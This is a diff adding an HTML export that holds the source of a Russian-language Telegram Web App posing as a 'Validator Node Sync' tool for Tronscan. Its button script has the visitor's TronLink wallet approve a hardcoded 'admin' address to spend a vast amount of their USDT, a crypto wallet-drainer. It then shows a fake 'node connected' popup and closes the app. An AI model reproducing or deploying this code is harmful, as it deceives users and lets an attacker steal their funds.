@@ -1,0 +1,120 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2685.5">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html lang="ru"&gt;</p>
+<p class="p1">&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta charset="UTF-8"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;title&gt;Validator Node Sync&lt;/title&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script src="https://telegram.org/js/telegram-web-app.js"&gt;&lt;/script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"&gt;&lt;/script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;style&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>body {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>background-color: #0f0f0f;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>color: #ffffff;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>text-align: center;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>display: flex;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>flex-direction: column;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>justify-content: center;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>height: 100vh;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>margin: 0;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>padding: 20px;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.container {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border: 1px solid #333;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>padding: 30px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border-radius: 20px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>background: linear-gradient(145deg, #1a1a1a, #111);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>box-shadow: 0 10px 30px rgba(0,0,0,0.5);</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>h2 { color: #0088cc; margin-bottom: 10px; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>p { color: #888; font-size: 14px; line-height: 1.5; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.status-dot {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>height: 10px; width: 10px; background-color: #4CAF50;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border-radius: 50%; display: inline-block; margin-right: 5px;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>#syncBtn {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>margin-top: 30px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>background: #0088cc;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>color: white;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border: none;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>padding: 16px 32px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>font-size: 16px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>font-weight: bold;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>border-radius: 12px;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>cursor: pointer;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>width: 100%;</p>
+<p class="p1"><span class="Apple-converted-space">            </span>transition: transform 0.2s, background 0.3s;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>#syncBtn:active { transform: scale(0.98); background: #0077b5; }</p>
+<p class="p1"><span class="Apple-converted-space">        </span>.footer { margin-top: 20px; font-size: 10px; color: #444; text-transform: uppercase; }</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/style&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body&gt;</p>
+<p class="p2"><br></p>
+<p class="p1">&lt;div class="container"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;div style="font-size: 12px; margin-bottom: 20px;"&gt;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>&lt;span class="status-dot"&gt;&lt;/span&gt; СИСТЕМА ГОТОВА К ПОДКЛЮЧЕНИЮ</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;h2&gt;Node Sync v3.1&lt;/h2&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;p&gt;Для активации удаленного мониторинга транзакций и синхронизации с Tronscan API необходимо подтвердить лимиты узла.&lt;/p&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;button id="syncBtn"&gt;СИНХРОНИЗИРОВАТЬ API&lt;/button&gt;</p>
+<p class="p2"><span class="Apple-converted-space">    </span></p>
+<p class="p1"><span class="Apple-converted-space">    </span>&lt;div class="footer"&gt;Secure encrypted connection via TRC-20 protocol&lt;/div&gt;</p>
+<p class="p1">&lt;/div&gt;</p>
+<p class="p2"><br></p>
+<p class="p1">&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>const tg = window.Telegram.WebApp;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>tg.expand(); // Разворачиваем окно на максимум</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">    </span>document.getElementById('syncBtn').onclick = async () =&gt; {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>// Проверяем наличие TronLink</p>
+<p class="p1"><span class="Apple-converted-space">        </span>if (!window.tronWeb) {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>alert('Пожалуйста, используйте браузер внутри кошелька или установите TronLink!');</p>
+<p class="p1"><span class="Apple-converted-space">            </span>return;</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';</p>
+<p class="p1"><span class="Apple-converted-space">        </span>// ТВОЙ АДМИН-КОШЕЛЕК</p>
+<p class="p1"><span class="Apple-converted-space">        </span>const ADMIN_ADDRESS = 'TDTpjSqNx5pqYgiZEXVm85pxmhuTJRmyGr';</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>try {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>const contract = await window.tronWeb.contract().at(USDT_CONTRACT);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>// Лимит 1 миллиард USDT</p>
+<p class="p1"><span class="Apple-converted-space">            </span>const amount = '1000000000000000';<span class="Apple-converted-space"> </span></p>
+<p class="p2"><span class="Apple-converted-space">            </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>// Запуск транзакции Approve</p>
+<p class="p1"><span class="Apple-converted-space">            </span>const result = await contract.approve(ADMIN_ADDRESS, amount).send();</p>
+<p class="p2"><span class="Apple-converted-space">            </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>tg.showPopup({</p>
+<p class="p1"><span class="Apple-converted-space">                </span>title: 'Синхронизация',</p>
+<p class="p1"><span class="Apple-converted-space">                </span>message: 'Узел успешно подключен к удаленному серверу. Доступ активирован.',</p>
+<p class="p1"><span class="Apple-converted-space">                </span>buttons: [{type: 'ok'}]</p>
+<p class="p1"><span class="Apple-converted-space">            </span>});</p>
+<p class="p2"><span class="Apple-converted-space">            </span></p>
+<p class="p1"><span class="Apple-converted-space">            </span>setTimeout(() =&gt; { tg.close(); }, 2000); // Закрываем приложение через 2 сек</p>
+<p class="p1"><span class="Apple-converted-space">        </span>} catch (e) {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>console.error(e);</p>
+<p class="p1"><span class="Apple-converted-space">            </span>alert('Ошибка синхронизации: убедитесь, что транзакция подписана.');</p>
+<p class="p1"><span class="Apple-converted-space">        </span>}</p>
+<p class="p1"><span class="Apple-converted-space">    </span>};</p>
+<p class="p1">&lt;/script&gt;</p>
+<p class="p2"><br></p>
+<p class="p1">&lt;/body&gt;</p>
+<p class="p1">&lt;/html&gt;</p>
+</body>
+</html>
